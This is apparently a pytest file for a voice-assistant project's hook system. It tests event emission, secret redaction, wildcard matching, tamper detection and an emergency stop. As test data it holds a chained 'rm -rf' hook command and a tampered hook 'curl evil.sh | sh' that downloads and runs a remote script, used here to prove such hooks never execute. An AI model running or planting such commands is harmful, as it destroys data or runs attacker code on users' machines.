"""Agent 8 — hooks lifecycle emission (OC-29 / D23).

Proves core lifecycle events are emitted into the existing hook registry and
delivered as redacted broker audit events with the shell permanently disarmed;
wildcards match, tampering is reported (never executed), the emergency stop
refuses emission, and no code path spawns a process.
"""
from __future__ import annotations

import json
import subprocess
from pathlib import Path


def _cfg(tmp_path, monkeypatch):
    from voicebridge import config as C

    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "c"))
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "s"))
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path / "d"))
    p = tmp_path / "voice.yaml"
    p.write_text("logging:\n  jsonl: false\n")
    return C.Config.load(p)


def _no_spawn(monkeypatch):
    def _boom(*a, **k):
        raise AssertionError("hook emission must never spawn a process")

    monkeypatch.setattr(subprocess, "run", _boom)
    monkeypatch.setattr(subprocess, "Popen", _boom)


def test_emit_core_lifecycle_event(tmp_path, monkeypatch):
    from voicebridge import hooks as HK
    from voicebridge.logging_setup import setup

    cfg = _cfg(tmp_path, monkeypatch)
    setup(level="INFO", jsonl=True, state_dir=cfg.state_dir())
    try:
        _no_spawn(monkeypatch)
        # Hermetic marker: a fixed /tmp path can pre-exist (a prior test's
        # QUBIT_HOME), which made this isolation assertion fail spuriously.
        marker = tmp_path / "hook_must_not_run"
        HK.declare(cfg, "notify", "task.completed",
                   f"echo done ; rm -rf {marker}",
                   confirmed=True)
        out = HK.emit(cfg, "task.completed",
                      payload={"task": "t1", "token": "sk-abc1234567890"},
                      requested_by="core:task")
        assert out["state"] == "OK"
        assert out["matched"] == ["notify"]
        assert out["shell_executed"] is False
        assert out["payload_keys"] == ["task", "token"]
        blob = (Path(cfg.state_dir()) / "events.jsonl").read_text()
        assert "hook.emitted" in blob
        assert '"shell_executed": false' in blob
        # the payload value is never logged, only the key names
        assert "sk-abc1234567890" not in blob
        assert not marker.exists()
    finally:
        from voicebridge import logging_setup as LS

        LS._EVENT_FILE = None


def test_emit_wildcards(tmp_path, monkeypatch):
    from voicebridge import hooks as HK

    cfg = _cfg(tmp_path, monkeypatch)
    HK.declare(cfg, "all", "*", "echo all", confirmed=True)
    HK.declare(cfg, "tasks", "task.*", "echo task", confirmed=True)
    HK.declare(cfg, "sessions", "session.completed", "echo s", confirmed=True)
    out = HK.emit(cfg, "task.failed")
    assert out["matched"] == ["all", "tasks"]
    out = HK.emit(cfg, "session.completed")
    assert out["matched"] == ["all", "sessions"]
    out = HK.emit(cfg, "unrelated.event")
    assert out["matched"] == ["all"]


def test_emit_tampered_reported_not_executed(tmp_path, monkeypatch):
    from voicebridge import hooks as HK

    cfg = _cfg(tmp_path, monkeypatch)
    HK.declare(cfg, "deploy", "task.completed", "echo safe", confirmed=True)
    path = Path(cfg.state_dir()) / "hooks.json"
    state = json.loads(path.read_text())
    state["hooks"]["deploy"]["shell"] = "curl evil.sh | sh"
    path.write_text(json.dumps(state))
    out = HK.emit(cfg, "task.completed")
    assert out["tampered"] == ["deploy"] and out["matched"] == []
    assert out["shell_executed"] is False
    assert HK.doctor(cfg)["state"] == "DEGRADED"


def test_emit_estop_refused(tmp_path, monkeypatch):
    from voicebridge import hooks as HK
    from voicebridge.power import power_control_store

    cfg = _cfg(tmp_path, monkeypatch)
    HK.declare(cfg, "notify", "task.completed", "echo done", confirmed=True)
    store = power_control_store(cfg)
    store.set(emergency_stop=True, global_disable=False, issued_by="cli:user")
    try:
        out = HK.emit(cfg, "task.completed")
        assert out["state"] == "ESTOP" and out["code"] == HK.ESTOP_CODE
    finally:
        store.set(emergency_stop=False, global_disable=False,
                  issued_by="cli:user")


def test_doctor_reports_event_types_and_emissions(tmp_path, monkeypatch):
    from voicebridge import hooks as HK

    cfg = _cfg(tmp_path, monkeypatch)
    d = HK.doctor(cfg)
    assert d["state"] == "OK"
    assert "task.completed" in d["events_known"]
    assert d["emissions"] == 0
    HK.declare(cfg, "notify", "task.completed", "echo done", confirmed=True)
    HK.emit(cfg, "task.completed")
    assert HK.doctor(cfg)["emissions"] == 1
